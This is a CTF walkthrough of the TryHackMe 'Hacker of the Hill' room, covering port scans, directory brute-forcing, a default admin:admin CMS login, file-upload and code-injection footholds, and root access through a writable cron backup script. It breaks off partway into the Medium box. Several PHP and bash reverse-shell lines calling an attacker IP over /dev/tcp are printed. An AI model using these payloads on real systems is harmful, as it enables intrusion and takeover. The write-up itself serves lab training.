@@ -1,0 +1,333 @@
+I"r;<h2 id="introduction">Introduction</h2>
+<p>This is partical room from tryhackme entitled <code>hackerofthehill</code> with 3 difficulty like easy, Medium ,Hard. For submitted any flag to the hackerone platform, we can get private bug bounty invitation. Link room in <a href="https://tryhackme.com/room/hackerofthehill">here</a></p>
+
+<h2 id="easy">Easy</h2>
+
+<h3 id="scanning">Scanning</h3>
+
+<p>Let’s just scanning full port of the box : <code>nmap 10.10.133.88 -sC -sV -p-</code>. 
+Result :</p>
+<pre><code class="language-bash">nmap 10.10.179.236 -p- --min-rate 10000                                                                 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 19:59 WIB
+Warning: 10.10.179.236 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.179.236
+Host is up (0.34s latency).
+Not shown: 65511 closed ports
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+80/tcp    open     http
+2120/tcp  filtered kauth
+5301/tcp  filtered hacl-gs
+8000/tcp  open     http-alt
+8001/tcp  open     vcom-tunnel
+8002/tcp  open     teradataordbms
+9999/tcp  open     abyss
+Nmap done: 1 IP address (1 host up) scanned in 29.46 seconds
+</code></pre>
+<p>Full port Enumeration : <code>nmap 10.10.179.236 -p80,8000,8001,8002,9999 -sC -sV</code>
+Result :</p>
+<pre><code class="language-bash">nmap 10.10.179.236 -p80,8000,8001,8002,9999 -sC -sV
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 20:01 WIB
+Nmap scan report for 10.10.179.236
+Host is up (0.34s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/vbcms
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: VeryBasicCMS - Home
+8001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: My Website
+|_Requested resource was /?page=home.php
+8002/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Learn PHP
+9999/tcp open  abyss?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Thu, 11 Mar 2021 13:01:56 GMT
+|     Content-Length: 0
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Thu, 11 Mar 2021 13:01:54 GMT
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Date: Thu, 11 Mar 2021 13:01:55 GMT
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9999-TCP:V=7.91%I=7%D=3/11%Time=604A14C2%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,4B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2011\x20Mar\x2020
+SF:21\x2013:01:54\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,4
+SF:B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2011\x20Mar\x202021\x2013:0
+SF:1:55\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,4B,"H
+SF:TTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2011\x20Mar\x202021\x2013:01:56
+SF:\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(GenericLines,67,"HTTP/1\.1\
+SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
+SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest
+SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
+SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
+SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
+SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
+SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
+SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
+SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
+SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
+SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
+SF:equest")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
+SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
+SF:0\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
+SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
+SF:20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x2040
+SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
+SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 112.57 seconds
+</code></pre>
+<h3 id="port-8000">Port 8000</h3>
+
+<p>I have done checking a port 80 and its just default apache page and nothing there. So i move on to port 8000 and there is the page :</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_1_easy.png" alt="img" /></p>
+
+<p>Then i’m trying to using gobuster for brute the directory and file .</p>
+
+<pre><code>gobuster dir -u http://10.10.179.236:8000/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.166.45:8000
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt,html,php
+[+] Timeout:        10s
+===============================================================
+2021/03/11 20:10:18 Starting gobuster in directory enumeration mode
+===============================================================
+/about (Status: 200)
+/contact (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2021/03/11 20:25:47 Finished
+===============================================================
+</code></pre>
+<p>As you can see we found robots.txt, let’s take a look at that.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_2_easy.png" alt="img" /></p>
+
+<p>The file robots.txt tell us that there is some directory of cms, Now let’s see the page <code>/vbcms</code>.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_3_easy.png" alt="img" /></p>
+
+<p>In this login form i’m trying to performs some default user credentials and i found user of admin <code>admin:admin</code> .</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_4_easy.png" alt="img" /></p>
+
+<p>Then there is some basic of cms we can edit to getting any shell, to simply we can use php command shell like this.</p>
+
+<pre><code class="language-php">&lt;?php  
+  exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.2.47.251/9001 0&gt;&amp;1' ");  
+?&gt;
+</code></pre>
+<p><img src="/assets/thm_hackerofthehill/bg_6_easy.png" alt="img" /></p>
+
+<p>Now we have the shell, After that we can get the flag.</p>
+
+<pre><code class="language-bash">serv1@web-serv:/var/www/serv1/public$ cat /usr/games/fortune                                     
+cat /usr/games/fortune                                                               
+VEhNe05HSTROems0T0dJM01ERTRORFV6TldZd05qTXlaalkxfQo=                                 
+serv1@web-serv:/var/www/serv1/public$ cat /usr/games/fortune|base64 -d               
+cat /usr/games/fortune|base64 -d                                                     
+THM{NG----------------------------Y1}                                                
+serv1@web-serv:/var/www/serv1/public$ 
+</code></pre>
+
+<h3 id="port-8001">Port 8001</h3>
+
+<p>Let’s go to port 8001 :</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_7_easy.png" alt="img" /></p>
+
+<p>Then we go to tab Support :</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_8_easy.png" alt="img" /></p>
+
+<p>At this section i am using burpsuite to capture the response.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_9_easy.png" alt="img" /></p>
+
+<p>As you can see we can know where the location of the file upload and i’m tried to put the link upload to the parameter <code>?page=</code> and there is the page.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_10_easy.png" alt="img" /></p>
+
+<p>The page shows us the text of the image we uploaded. So i tried to put basic command php and see what it works .</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_11_easy.png" alt="img" /></p>
+
+<p>Then Let’s take a look at source code</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_12_easy.png" alt="img" /></p>
+
+<p>As you can see that its work. Now let’s put shell on php code like we doing before.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_13_easy.png" alt="img" /></p>
+
+<p>Now we get the shell of serv2 :D, Let’s go to flag in <code>/var/lib/rary</code>.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_14_easy.png" alt="img" /></p>
+
+<h3 id="port-8002">Port 8002</h3>
+
+<p>After port 8001 we gonna to take a look at port 8002 and here the page :</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_1_medium.png" alt="img" /></p>
+
+<p>Then we can create accound <code>Sign me Up</code> and after sign up there can’t working, now just take a look at <code>try free lesson</code> and check id <code>echo `id`;</code>.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_2_medium.png" alt="img" /></p>
+
+<p>then we can get any shell from this:</p>
+<pre><code class="language-php">exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.2.47.251/9001 0&gt;&amp;1' ");
+</code></pre>
+<p><img src="/assets/thm_hackerofthehill/bg_3_medium.png" alt="img" /></p>
+
+<p>then <code>nc -lvnp 9001</code>.</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_4_medium.png" alt="img" /></p>
+
+<p>So we can get flag in <code>/var/www/serv4/index.php</code></p>
+<pre><code class="language-bash">serv3@web-serv:/var/www/serv3/public$ cat /var/www/serv4/index.php
+                                                
+THM{Ym---------------------------zZh}
+</code></pre>
+<h3 id="privilage-escalation">Privilage Escalation</h3>
+
+<p>First i do checking crontab and there is have some process backup and its running on root. <code>/etc/crontab</code>:</p>
+<pre><code class="language-bash">
+serv3@web-serv:/var/www/serv3/public$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /home/serv3/backups/backup.sh
+</code></pre>
+
+<p>Since file permission is can be execute, then we can change backup.sh to all user <code>chmod 777 /home/serv3/backups/backup.sh</code> and add code execution like this <code>echo 'bash -i &gt;&amp; /dev/tcp/10.2.47.251/9003 0&gt;&amp;1' &gt;&gt; /home/serv3/backups/backu.sh</code>, the last of it is prepare the netcat <code>nc -lvnp 9003</code>. Wait until we can hit in nc.
+<img src="/assets/thm_hackerofthehill/bg_5_medium.png" alt="img" /></p>
+
+<p>Then wait it</p>
+
+<p><img src="/assets/thm_hackerofthehill/bg_6_medium.png" alt="img" /></p>
+
+<p>Now we have the root user, so you can grab any flag or all flag if you want :D. the flag of root will be in <code>/root/root.txt</code></p>
+
+<h2 id="medium">Medium</h2>
+
+<h3 id="scanning-1">Scanning</h3>
+
+<p>Let’s just scanning full port of the box : ` nmap 10.10.59.182 -p- –min-rate 10000 `</p>
+<pre><code class="language-bash">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 17:22 WIB
+Nmap scan report for 10.10.59.182
+Host is up (0.39s latency).
+Not shown: 65529 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 66.55 seconds
+</code></pre>
+<p>Now let’s enumeration all port : <code>nmap 10.10.59.182 -p80,135,139,445,3269 -sC -sV</code></p>
+
+<pre><code class="language-bash">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 17:25 WIB
+Nmap scan report for 10.10.59.182
+Host is up (0.37s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: PhotoStore - Home
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3269/tcp open  tcpwrapped
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -2s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-03-18T10:25:46
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.26 seconds
+</code></pre>
+
+<p>Let’s take a look at port 80 :</p>
+
+<p><img src="/assets/thm_hackerofthehill/medium1.png" alt="img" /></p>
+
+<p>Now let’s signup and login this website then will be able go to dashboard.</p>
+
+<p><img src="/assets/thm_hackerofthehill/medium2.png" alt="img" /></p>
+
+<p>then i’m gonna to test upload file .jpg and this happens.</p>
+
+<p><img src="/assets/thm_hackerofthehill/medium3.png" alt="img" /></p>
+
+<p>if we clicked then web show us the image.</p>
+
+<p><img src="/assets/thm_hackerofthehill/medium4.png" alt="img" /></p>
+
+<p>and after looking around i found script.js which is we can disable it and try any command injection in username.</p>
+<pre><code class="language-javascript">$('input[name="username"]').keyup(function(){
+    let username = $(this).val();
+    $(this).val( username.replace(/([^a-zA-Z0-9])/g,'') );
+});
+</code></pre>
+<p>i’m trying go to profile , then disable the script.js. I’m trying disable it in mozila firefox which just going to inspect then go to network and disable it.</p>
+
+<p><img src="/assets/thm_hackerofthehill/medium5.png" alt="img" /></p>
+
+<p>Now trying to get</p>
+
+:ET
